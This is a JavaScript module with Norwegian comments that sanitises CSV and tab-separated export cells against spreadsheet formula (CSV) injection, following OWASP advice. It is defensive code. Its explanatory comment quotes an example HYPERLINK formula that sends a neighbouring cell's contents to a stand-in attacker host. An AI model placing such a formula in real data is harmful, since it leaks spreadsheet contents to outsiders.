// 🧮 Felles cellevask for alt vi skriver til CSV (og til utklippstavla som
// tabulator-tekst) — ÉN plass, så ingen eksport glemmer det.
//
// HVORFOR: Excel tolker en celle som begynner med = + - @ som en FORMEL, også
// når den kommer fra en CSV-fil eller limes inn. Teksten i fila vår kommer fra
// folk vi ikke styrer: navn i IFC-modellen (arkitekt/RIB), markeringstekst og
// forfatternavn fra byggeplassen, hendelser i adminloggen. En markering med
// teksten «=HYPERLINK("https://ond.example/?"&A1;"Klikk")» ville blitt en
// klikkbar lenke som sender nabocellen ut — eller verre, en DDE-formel. Det
// heter «CSV injection» og er en kjent vei inn via regneark.
//
// Tab og CR foran teller også: Excel hopper over dem og ser formelen bak.
//
// Løsningen er den vanlige (OWASP): sett en apostrof foran. Da viser Excel
// teksten som tekst. admin.js gjorde dette allerede for loggen; nå bruker
// alle eksportene samme regel.
//
// MEN: ekte negative TALL («-12,5», «-3») skal forbli tall — ellers kan ikke
// tallene summeres i Excel. Et rent tall er aldri en formel, så det slipper.

// Rent tall med punktum eller desimalkomma, valgfritt fortegn. Ingen
// tusenskiller — nb() i elements.js skriver aldri det.
const RENT_TALL = /^[+-]?\d+(?:[.,]\d+)?$/;
const FARLIG_START = /^[=+\-@\t\r]/;

// Gjør verdien ufarlig som celle-INNHOLD (uten sitering). Tall (typen number)
// og rene talltekster slipper urørt.
export function csvTrygg(v) {
  if (v === undefined || v === null) return "";
  if (typeof v === "number") return String(v);
  const s = String(v);
  if (FARLIG_START.test(s) && !RENT_TALL.test(s)) return "'" + s;
  return s;
}

// Én CSV-celle i norsk Excel-dialekt (semikolon): vasket, og sitert bare når
// den inneholder skilletegn, anførselstegn eller linjeskift.
export function csvCelle(v) {
  const s = csvTrygg(v);
  return /[;"\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

// Én celle til tabulator-separert tekst (lim inn i et åpent ark). Tab og
// linjeskift INNE i en celle ville sprengt raden, så de blir mellomrom.
export function tsvCelle(v) {
  return csvTrygg(v).replace(/[\t\r\n]+/g, " ");
}
